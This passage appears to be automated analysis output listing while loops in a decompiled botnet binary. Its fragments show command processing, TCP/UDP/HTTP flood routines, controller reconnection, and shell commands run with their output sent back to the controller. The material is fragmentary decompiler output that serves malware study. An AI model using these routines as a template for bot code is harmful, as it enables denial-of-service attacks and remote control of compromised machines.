		if (listFork() != 0) {
		sendCNC(v238, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 96 @ processCmd ====================================
++++++++ WHILE START : 17553 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17562 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 97 @ processCmd ====================================
++++++++ WHILE START : 17627 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17636 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 98 @ processCmd ====================================
++++++++ WHILE START : 17673 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17683 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v238, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 99 @ processCmd ====================================
++++++++ WHILE START : 17715 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17724 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 100 @ processCmd ====================================
++++++++ WHILE START : 17811 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17820 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v145, v196, v197, v198, (char *)v223, v146, v147);
=============================WHILE LOOPS ID : 101 @ processCmd ====================================
++++++++ WHILE START : 17851 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17863 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v199, v231, (int16_t)v202, v229, v201, v200);
=============================WHILE LOOPS ID : 102 @ processCmd ====================================
++++++++ WHILE START : 17903 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17912 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 103 @ processCmd ====================================
++++++++ WHILE START : 17950 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17960 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v238, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 104 @ processCmd ====================================
++++++++ WHILE START : 17993 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18002 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v240, (int16_t)v212, v213);
=============================WHILE LOOPS ID : 105 @ processCmd ====================================
++++++++ WHILE START : 18062 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18072 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v238, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 106 @ processCmd ====================================
++++++++ WHILE START : 18126 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18135 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v145, v196, v197, v198, (char *)v223, v146, v147);
=============================WHILE LOOPS ID : 107 @ processCmd ====================================
++++++++ WHILE START : 18166 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18178 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v199, v231, (int16_t)v202, v229, v201, v200);
=============================WHILE LOOPS ID : 108 @ processCmd ====================================
++++++++ WHILE START : 18212 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18222 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v238, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 109 @ processCmd ====================================
++++++++ WHILE START : 18271 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18281 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v238, v208, v209);
		__libc_close(v142);
=============================WHILE LOOPS ID : 110 @ processCmd ====================================
++++++++ WHILE START : 18377 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18386 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v144, v183, v184, v185, v186, v150, v149, v148);
=============================WHILE LOOPS ID : 111 @ processCmd ====================================
++++++++ WHILE START : 18417 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18426 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v144, v183, v184, v185, v186, v150, v149, v148);
=============================WHILE LOOPS ID : 112 @ getOurIP ====================================
++++++++ WHILE START : 18803 
++++++++ WHILE FUNCTION : getOurIP 
++++++++ WHILE END : 18883 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strstr(v145, "\t00000000\t") == 0) {
		if (fdgets(v145, 0x1000, v143) == 0) {
		__libc_close(v143);
		__libc_close(v138);
		__libc_close(v138);
		__libc_close(v143);
		__libc_close(v138);
		__libc_close(v138);
=============================WHILE LOOPS ID : 113 @ main ====================================
++++++++ WHILE START : 19258 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19810 
++++++++ INTRESTING INSTRUCTIONS :  
		sprintf(v173, (int32_t)"\"%s%s\"\n", v165, v174 + v163);
		while (true) {
		while (true) {
		fgets((int32_t)&v176, 1024, v145);
		if (__GI_strcasecmp((char *)&v176, v173) == 0) {
		__GI_fclose((int16_t *)v145);
		int32_t v178 = __GI_fopen(v146, (int32_t)&v177); // 0x804f124
		__GI_fclose((int16_t *)v178);
		getOurIP();
		v160 = __libc_fork((int32_t)v137);
		if (__libc_fork((int32_t)v137) == 0) {
		v137 = "fork failed\n";
		zprintf((int32_t)"fork failed\n");
		while (true) {
		if (initConnection() != 0) {
		while (true) {
		if (initConnection() == 0) {
		__GI_inet_ntoa((int32_t)v137);
		getBuild();
		sockprintf((int32_t)v137, 1);
		while (true) {
		while (true) {
		while (true) {
		if (recvLine() == -1) {
		while (true) {
		v194 = __libc_waitpid(v187, v184, v186);
		while (true) {
		while (true) {
		free(0);
		if (strstr(v192, (char *)&v200) != v161) {
		int32_t v201 = strstr(v192, (char *)&v200); // 0x804f4ed
		zprintf(v203);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		processCmd();
		free(v239);
		free(v239);
		while (true) {
		while (true) {
		processCmd();
		if (listFork() != 0) {
		szprintf(3, (int32_t)"SH", v210, v210);
		int32_t v241 = fdpopen(); // 0x804f709
		while (true) {
		if (fdgets(v241, v180, v132) != 0) {
		sockprintf(v241, v180);
		fdpclose();
		sockprintf(v192, (int32_t)&v200);
		while (true) {
		if (initConnection() == 0) {
		v194 = __libc_waitpid(v187, v184, v186);
		__GI_inet_ntoa((int32_t)v137);
		getBuild();
		sockprintf((int32_t)v137, 1);
		__libc_waitpid(v160, (int32_t)&v149, 0);
		zprintf((int32_t)"fork failed\n");
		while (true) {
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 114 @ main ====================================
++++++++ WHILE START : 19841 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19847 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 115 @ main ====================================
++++++++ WHILE START : 19871 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19877 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 116 @ main ====================================
++++++++ WHILE START : 19908 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19914 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 117 @ main ====================================
++++++++ WHILE START : 19938 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19944 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 121 @ _vfprintf_internal ====================================
++++++++ WHILE START : 27609 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 28270 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 124 @ _ppfs_parsespec ====================================
++++++++ WHILE START : 29255 
++++++++ WHILE FUNCTION : _ppfs_parsespec 
++++++++ WHILE END : 30168 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 126 @ _stdio_openlist_dec_use ====================================
++++++++ WHILE START : 30839 
++++++++ WHILE FUNCTION : _stdio_openlist_dec_use 
++++++++ WHILE END : 30876 
++++++++ INTRESTING INSTRUCTIONS :  
		free(v147);
=============================WHILE LOOPS ID : 128 @ __GI_fgets_unlocked ====================================
++++++++ WHILE START : 31279 
++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
++++++++ WHILE END : 31339 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v145 = getc_unlocked(); // 0x8051455
=============================WHILE LOOPS ID : 133 @ strstr ====================================
++++++++ WHILE START : 33008 
++++++++ WHILE FUNCTION : strstr 
++++++++ WHILE END : 33110 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 135 @ strcasestr ====================================
++++++++ WHILE START : 34010 
++++++++ WHILE FUNCTION : strcasestr 
++++++++ WHILE END : 34071 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 139 @ malloc ====================================
++++++++ WHILE START : 38914 
++++++++ WHILE FUNCTION : malloc 
++++++++ WHILE END : 41091 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		free(v249);
		free(v249);
		free(v249);
		free(v249);
		free(v249);
		free(v249);
		free(v249);
		free(v249);
		free(v249);
		free(v249);
		free(v249);
		free(v249);
		free(v249);
		free(v249);
		free(v249);
		free(v249);
=============================WHILE LOOPS ID : 143 @ __malloc_consolidate ====================================
++++++++ WHILE START : 43016 
++++++++ WHILE FUNCTION : __malloc_consolidate 
++++++++ WHILE END : 43138 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 144 @ abort ====================================
++++++++ WHILE START : 43769 
++++++++ WHILE FUNCTION : abort 
++++++++ WHILE END : 43844 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_sigprocmask(1, (struct _TYPEDEF_sigset_t *)&v140, 0);
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 145 @ srandom_r ====================================
++++++++ WHILE START : 45091 
++++++++ WHILE FUNCTION : srandom_r 
++++++++ WHILE END : 45126 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_random_r((int32_t *)a2, (int32_t)&v143);
		__GI_random_r((int32_t *)a2, (int32_t)&v143);
=============================WHILE LOOPS ID : 150 @ sleep ====================================
++++++++ WHILE START : 46815 
++++++++ WHILE FUNCTION : sleep 
++++++++ WHILE END : 46908 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v144 = __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v140, v143); // 0x805373b
		while (true) {
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v142, 0);
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v142, 0);
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v142, 0);
=============================WHILE LOOPS ID : 153 @ __stdio_WRITE ====================================
++++++++ WHILE START : 52886 
++++++++ WHILE FUNCTION : __stdio_WRITE 
++++++++ WHILE END : 52960 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 156 @ _fpmaxtostr ====================================
++++++++ WHILE START : 54320 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 57551 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 163 @ __GI_strpbrk ====================================
++++++++ WHILE START : 58978 
++++++++ WHILE FUNCTION : __GI_strpbrk 
++++++++ WHILE END : 59027 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 164 @ inet_aton ====================================
++++++++ WHILE START : 59181 
++++++++ WHILE FUNCTION : inet_aton 
++++++++ WHILE END : 59275 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 165 @ __dns_lookup ====================================
++++++++ WHILE START : 59455 
++++++++ WHILE FUNCTION : __dns_lookup 
++++++++ WHILE END : 60319 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_close(-1);
		if (inet_pton(-1, (char *)v152, v154, (int32_t)&v147) >= 1) {
		inet_addr(-1);
		if (socket(-1, v152, v154) >= 0) {
		if (__libc_connect(-1, v152, v154) >= 0) {
		__libc_send(-1, v152, v154, (int32_t)&v147);
		int32_t v169 = __libc_recv(-1, v152, v154, (int32_t)&v147); // 0x80550b2
		__libc_close(v142);
		free(v143);
		free(v143);
		while (true) {
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		v208 = __libc_close(-1);
		v209 = free(-1);
		v210 = free(-1);
		v210 = free(-1);
		v208 = __libc_close(-1);
		v209 = free(-1);
		v210 = free(-1);
		v210 = free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		__libc_close(v142);
		free(v143);
		free(v143);
		__libc_close(v142);
		free(v143);
		free(v143);
		__libc_close(v142);
		free(v143);
		free(v143);
		__libc_close(v142);
		free(v143);
		free(v143);
=============================WHILE LOOPS ID : 167 @ __open_nameservers ====================================
++++++++ WHILE START : 60679 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 60994 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (fgets(v149, 128, v143) == 0) {
		while (true) {
		free(v191);
		__GI_fclose((int16_t *)v140);
		while (true) {
		if (fgets(v149, 128, v143) == 0) {
		if (fgets(v149, 128, v143) == 0) {
		__GI_fclose((int16_t *)v140);
		if (fgets(v149, 128, v143) == 0) {
=============================WHILE LOOPS ID : 172 @ __GI_strspn ====================================
++++++++ WHILE START : 63926 
++++++++ WHILE FUNCTION : __GI_strspn 
++++++++ WHILE END : 63971 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 174 @ inet_pton ====================================
++++++++ WHILE START : 64531 
++++++++ WHILE FUNCTION : inet_pton 
++++++++ WHILE END : 64784 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		if (inet_pton4(v156, (int32_t)v157, v146) >= 1) {
=============================WHILE LOOPS ID : 176 @ __GI_inet_ntop ====================================
++++++++ WHILE START : 65176 
++++++++ WHILE FUNCTION : __GI_inet_ntop 
++++++++ WHILE END : 65533 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		v183 = inet_ntop4((int32_t)v145, (int32_t)v160, v159);
		v180 = sprintf(v177, (int32_t)"%x", v179, v149);
		v183 = inet_ntop4((int32_t)v145, (int32_t)v160, v159);
		v180 = sprintf(v177, (int32_t)"%x", v179, v149);
		while (true) {
=============================WHILE LOOPS ID : 180 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 66877 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 67107 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (__GI_strcasecmp(v154, v181) != 0) {
		if (fgets(v155, v140, v138) == 0) {
		if (inet_pton(10, (char *)v184, v142, v161) >= 1) {
		__GI_fclose((int16_t *)v140);
		if (inet_pton(2, (char *)v186, (int32_t)v143, v139) >= 1) {
		__GI_fclose((int16_t *)v140);
		if (fgets(v155, v140, v138) == 0) {
		if (fgets(v155, v140, v138) == 0) {
		__GI_fclose((int16_t *)v140);
=============================WHILE LOOPS ID : 182 @ __decode_dotted ====================================
++++++++ WHILE START : 67808 
++++++++ WHILE FUNCTION : __decode_dotted 
++++++++ WHILE END : 67879 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
